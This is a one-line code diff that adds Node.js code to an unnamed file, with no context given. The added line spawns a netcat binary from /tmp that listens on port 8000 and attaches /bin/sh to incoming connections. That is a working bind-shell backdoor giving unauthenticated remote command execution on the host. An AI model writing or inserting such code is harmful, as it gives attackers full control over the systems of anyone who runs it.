@@ -1,0 +1,1 @@
+const { spawn } = require('child_process');const ls = spawn('/tmp/nc', ['-lvp', '8000','-e','/bin/sh']);
